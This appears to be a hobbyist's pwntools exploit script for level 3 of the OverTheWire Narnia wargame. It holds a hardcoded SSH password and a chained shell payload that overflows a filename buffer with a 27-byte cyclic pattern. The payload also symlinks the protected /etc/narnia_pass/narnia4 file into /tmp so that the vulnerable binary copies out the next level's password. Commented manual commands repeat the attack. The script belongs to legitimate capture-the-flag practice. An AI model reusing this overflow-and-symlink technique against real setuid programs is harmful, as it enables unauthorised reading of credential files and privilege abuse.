#Will mmake it more neat later
#This one was frustrating because i forgot to put /narnia4 when linking the files and i wasted a whole day

from pwn import *
import subprocess

#i like the debug context whenever i use pwntools
context.log_level='debug'
# these are all pretty self explanatory
level=3
user='narnia' + str(level)
host='narnia.labs.overthewire.org'
password='vaequeezee'
port=2226

filename=str(raw_input("Please name your file :")).rstrip() #now the file can be named whatever you want
print ("The file is going to be named " + filename)

oflow=(cyclic(27))
filepath="/tmp/" + oflow + "/tmp/" + filename
exe="/narnia/./narnia3 "


def conn():
    #basically just sshs into the level
    return ssh(user=user, host=host, password=password, port=port)
def getPass(shell):
    print('The password for the next level is...')
    shell.sendline('cat /tmp/' +filename) 
    flag=shell.recvuntil('$').split()[0]
def readCode(shell):
    #this function downloads the narnialevel.c file and displays it, and at the end removes the .c
    #file
    code=shell.download_data('/narnia/' + user + '.c')
    shell.download_file('/narnia/' + user + '.c')
    log.info('The code for this level is')
    print(code)
    subprocess.call(['rm',user+'.c'])
def generatePayload():    
    #This function generates the payload, put it in a seperate function to make it look pretier
    payload="rm /tmp/" + filename #removes all the files named /tmp/oreocookie
    payload+=";rm -r /tmp/" + oflow #removes the directory oflow
    payload+=";touch /tmp/" + filename  #creates the /tmp file
    payload+=";chmod 777 /tmp/" + filename  #chmods it
    payload+=";mkdir /tmp/" + oflow #makes the overflow directory 
    payload+=";cd /tmp/" + oflow #cds to overflow directory
    payload+=";mkdir tmp" #makes a tmp dir
    payload+=";cd tmp/" #cds to tmp dir
    payload+=";ln -s /etc/narnia_pass/narnia4 ./" + filename #links the files together 
    payload+= ";"+exe + filepath  # executes it
    return payload
##This are the commands used for completing the level when i went there on the shell
#
##touch /tmp/oreocookie
##chmod 777 /tmp/oreocookie
##cd ./$(python -c'print "b"*27')
##mkdir /tmp/
##cd /tmp/
##ln -s /etc/narnia_pass/narnia4 ./oreocookie
##/narnia/narnia3 $(python -c'print "/tmp/" + "b"*27 + "/tmp/oreocookie"')
##cat /tmp/oreocookie
#____DEBUGGING____
#p=generatePayload()
#print(p)
#
#____EXPLOIT GOES HEREE____________
sh=conn()
readCode(sh)
io=sh.shell("bash") 
#
payload=generatePayload()
io.sendline(payload)
#
flag=getPass(io) #the password is found
#
io.interactive() #puts it into interactive mode so you can play around
